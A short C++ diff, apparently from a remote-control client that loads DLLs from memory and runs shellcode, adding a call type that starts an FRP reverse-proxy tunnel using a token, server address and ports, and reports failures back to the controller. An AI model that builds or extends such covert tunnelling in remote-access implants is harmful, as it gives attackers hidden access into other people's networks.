@@ -194,6 +194,15 @@ typedef int (*RunSimpleTcpFunc)(
     int* statusPtr
 );
 
+typedef int (*RunSimpleTcpWithTokenFunc)(
+    const char* token, 
+	const char* serverAddr,
+	int serverPort,
+	int localPort,
+	int remotePort,
+	int* statusPtr
+);
+
 DWORD WINAPI ExecuteDLLProc(LPVOID param)
 {
     DllExecParam<>* dll = (DllExecParam<>*)param;
@@ -243,10 +252,29 @@ DWORD WINAPI ExecuteDLLProc(LPVOID param)
             SAFE_DELETE_ARRAY(user);
             break;
         }
+        case CALLTYPE_FRPC_STDCALL: {
+			RunSimpleTcpWithTokenFunc proc = module ? (RunSimpleTcpWithTokenFunc)runner->GetProcAddress(module, "RunSimpleTcpWithToken") : NULL;
+			char* user = (char*)dll->param.User;
+			FrpcParam* f = (FrpcParam*)user;
+			if (proc) {
+				Mprintf("MemoryGetProcAddress '%s' %s\n", info.Name, proc ? "success" : "failed");
+				int r = proc(f->privilegeKey, f->serverAddr, f->serverPort, f->localPort, f->remotePort,
+					&CKernelManager::g_IsAppExit);
+				if (r) {
+					char buf[100];
+					sprintf_s(buf, "Run %s [proxy %d] failed: %d", info.Name, f->localPort, r);
+					Mprintf("%s\n", buf);
+					ClientMsg msg("代理端口", buf);
+					This->SendData((LPBYTE)&msg, sizeof(msg));
+				}
+			}
+			SAFE_DELETE_ARRAY(user);
+			break;
+		}
         default:
             break;
         }
-        if (info.CallType != CALLTYPE_FRPC_CALL)
+        if (info.CallType != CALLTYPE_FRPC_CALL && info.CallType != CALLTYPE_FRPC_STDCALL)
             runner->FreeLibrary(module);
     } else if (info.RunType == SHELLCODE) {
         bool flag = info.CallType == CALLTYPE_IOCPTHREAD;
